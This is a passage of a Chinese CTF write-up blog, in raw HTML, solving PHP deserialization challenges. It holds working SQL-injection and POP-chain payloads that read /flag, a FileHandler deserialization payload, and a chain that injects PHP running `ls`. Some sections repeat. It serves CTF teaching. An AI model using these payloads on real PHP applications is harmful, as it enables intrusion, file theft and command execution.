class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><p>把得到的序列化内容放入cookie中，刷新几次，就可以发现文件名变化，木马文件生效。</p><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>信息收集</p><ol><li><p>源码上传到gitub上了</p><p><img src="/../images/1583830520899-1687419234884.png" alt="img"></p><p><img src="/../images/1583830536747-1687419234885.png" alt="img"></p><p><img src="/../images/image-20220807130328561-1687419234885.png" alt="image-20220807130328561"></p></li><li><p>show.php中的提示</p><p><img src="/../images/image-20220807130405750-1687419234885.png" alt="image-20220807130405750"></p><blockquote><p>半成品，只有文件的名字被保存。</p></blockquote></li></ol><p>代码审计</p><ol><li><p>序列化入口</p><p>helper类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#获得文件各种信息</span></span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];<span class="comment">#原文件名</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">#随机名</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];<span class="comment">#后缀</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#路径</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#序列化存储文件的大小</span></span><br><span class="line"><span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">    <span class="comment">#将文件信息插入到数据库中</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getfile</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#随机名</span></span><br><span class="line"><span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="comment">#处理文件后缀名</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line"><span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#title=文件名</span></span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">#处理文件各种信息</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line"><span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#insert插入文件各种信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>经过上面的代码审计可知，只对文件的后缀名作了处理，所以我们传参时能利用文件名即title</p><p>并且其将文件名保存到数据库中，就可能存在sql注入。</p><p><code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></p><p>→<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p></blockquote></li><li><p>反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line"><span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只将attr进行反序列化</p><p>所以我们可以构造title使得attr为我们构造的序列化内容。</p><p><code>title=1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#</code></p><p><code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p><p>→<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39; 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)</code></p></blockquote></li><li><p>利用</p><p>help类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谁调用了view_files</p><p>help类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>综上利用的属性</p><p>help-&gt;ifview &#x3D; True</p><p>help-&gt;config &#x3D; flag路径</p></blockquote><p>pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$ifview</span> = True; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>反序列化前<code>$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换为16进制 不能有引号</span></span><br><span class="line"><span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#`</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807140140896-1687419234886.png" alt="image-20220807140140896"></p><p><img src="/../images/image-20220807140151143-1687419234886.png" alt="image-20220807140151143"></p></li></ol><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="1-发现构造函数和反序列化函数知道考察序列化"><a href="#1-发现构造函数和反序列化函数知道考察序列化" class="headerlink" title="1.发现构造函数和反序列化函数知道考察序列化"></a>1.发现构造函数和反序列化函数知道考察序列化</h3><h3 id="2-代码审计得到大致流程"><a href="#2-代码审计得到大致流程" class="headerlink" title="2.代码审计得到大致流程"></a>2.代码审计得到大致流程</h3><p>传参str→is_valid()函数过滤→unserialize()函数触发destruct()函数：判断op→调用process()函数，op为2时→调用read()函数</p><h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">不修改属性，使用大S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="（1）op的值"><a href="#（1）op的值" class="headerlink" title="（1）op的值"></a>（1）op的值</h4><p>可以为’   2’和2来使destruct()中的不成立</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>绕过process()的</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="（2）成员改为public-x2F-使用大S"><a href="#（2）成员改为public-x2F-使用大S" class="headerlink" title="（2）成员改为public&#x2F;使用大S"></a>（2）成员改为public&#x2F;使用大S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.只允许可打印字符，而原先是protected类型，序列化以后会有不可打印字符%00</p><p>而查询得知在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p><p>2.protected属性序列化会引入\00<em>\00。但是\00是不可打印字符，所以我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。即手动将\00</em>\00变为\x00*\x00</p><h2 id="2022DASCTF-X-SU-三月春季挑战赛ezpop"><a href="#2022DASCTF-X-SU-三月春季挑战赛ezpop" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛ezpop"></a>2022DASCTF X SU 三月春季挑战赛ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()→what::<span class="title function_ invoke__">__tostring</span>()→mix::<span class="title function_ invoke__">__run</span>()→crow::<span class="title function_ invoke__">__invoke</span>()→fin::<span class="title function_ invoke__">__call</span>()→mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重复用到了fin-&gt;f1和min-&gt;m1，所以有$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz-1"><a href="#网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="1-发现构造函数和反序列化函数知道考察序列化-1"><a href="#1-发现构造函数和反序列化函数知道考察序列化-1" class="headerlink" title="1.发现构造函数和反序列化函数知道考察序列化"></a>1.发现构造函数和反序列化函数知道考察序列化</h3><h3 id="2-代码审计得到大致流程-1"><a href="#2-代码审计得到大致流程-1" class="headerlink" title="2.代码审计得到大致流程"></a>2.代码审计得到大致流程</h3><p>传参str→is_valid()函数过滤→unserialize()函数触发destruct()函数：判断op→调用process()函数，op为2时→调用read()函数</p><h3 id="3-payload-1"><a href="#3-payload-1" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">不修改属性，使用大S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="（1）op的值-1"><a href="#（1）op的值-1" class="headerlink" title="（1）op的值"></a>（1）op的值</h4><p>可以为’   2’和2来使destruct()中的不成立</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>绕过process()的</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="（2）成员改为public-x2F-使用大S-1"><a href="#（2）成员改为public-x2F-使用大S-1" class="headerlink" title="（2）成员改为public&#x2F;使用大S"></a>（2）成员改为public&#x2F;使用大S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.只允许可打印字符，而原先是protected类型，序列化以后会有不可打印字符%00</p><p>而查询得知在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p><p>2.protected属性序列化会引入\00<em>\00。但是\00是不可打印字符，所以我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。即手动将\00</em>\00变为\x00*\x00</p><h2 id="2022DASCTF-X-SU-三月春季挑战赛ezpop-1"><a href="#2022DASCTF-X-SU-三月春季挑战赛ezpop-1" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛ezpop"></a>2022DASCTF X SU 三月春季挑战赛ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()→what::<span class="title function_ invoke__">__tostring</span>()→mix::<span class="title function_ invoke__">__run</span>()→crow::<span 